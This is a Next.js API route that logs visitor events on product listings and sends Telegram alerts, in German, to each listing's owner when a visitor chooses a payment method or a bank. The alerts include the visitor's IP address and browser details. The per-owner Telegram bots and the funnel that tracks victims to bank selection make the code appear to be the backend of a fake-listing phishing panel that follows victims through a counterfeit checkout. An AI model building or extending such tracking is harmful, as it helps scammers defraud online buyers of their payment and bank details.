import { NextRequest } from "next/server";
import { prisma } from "@/lib/prisma";
import { corsResponse, corsOptions } from "@/lib/cors";
import { sendTelegramNotification } from "@/lib/telegram";

export async function OPTIONS() {
  return corsOptions();
}

export async function POST(req: NextRequest) {
  const body = await req.json();

  const validTypes = [
    "page_view",
    "continue_click",
    "chat_open",
    "message_sent",
    "address_submitted",
    "payment_method_selected",
    "bank_selected",
  ];

  if (!body.type || !validTypes.includes(body.type)) {
    return corsResponse({ error: "Invalid event type" }, 400);
  }

  if (!body.listingId) {
    return corsResponse({ error: "listingId is required" }, 400);
  }

  const listing = await prisma.listing.findUnique({
    where: { id: body.listingId },
    include: { user: { include: { settings: true } } },
  });
  if (!listing) {
    return corsResponse({ error: "Listing not found" }, 404);
  }

  const ip = req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip") || "";
  const userAgent = req.headers.get("user-agent") || "";

  const event = await prisma.event.create({
    data: {
      type: body.type,
      listingId: body.listingId,
      ip,
      userAgent,
      metadata: body.metadata || undefined,
    },
  });

  // Telegram notifications for payment events
  const settings = listing.user?.settings;
  if (settings?.telegramBotToken && settings?.telegramChatId) {
    const price = listing.price.toLocaleString("de-DE", { minimumFractionDigits: 2 });
    const shortUA = userAgent.length > 80 ? userAgent.substring(0, 80) + "..." : userAgent;

    let message = "";

    if (body.type === "payment_method_selected") {
      const method = body.metadata?.method === "credit_card" ? "Kreditkarte" : "Bank";
      const emoji = body.metadata?.method === "credit_card" ? "\u{1F4B3}" : "\u{1F3E6}";
      message = `${emoji} <b>Zahlungsmethode gewählt: ${method}</b>\n\n` +
        `\u{1F4E6} ${listing.title} (${price}\u20AC)\n` +
        `\u{1F310} IP: ${ip || "unbekannt"}\n` +
        `\u{1F4F1} ${shortUA || "unbekannt"}`;
    }

    if (body.type === "bank_selected") {
      const bankName = body.metadata?.bank || "Unbekannt";
      message = `\u{1F3E6} <b>Bank ausgewählt: ${bankName}</b>\n\n` +
        `\u{1F4E6} ${listing.title} (${price}\u20AC)\n` +
        `\u{1F310} IP: ${ip || "unbekannt"}\n` +
        `\u{1F4F1} ${shortUA || "unbekannt"}`;
    }

    if (message) {
      sendTelegramNotification(settings.telegramBotToken, settings.telegramChatId, message);
    }
  }

  return corsResponse(event, 201);
}
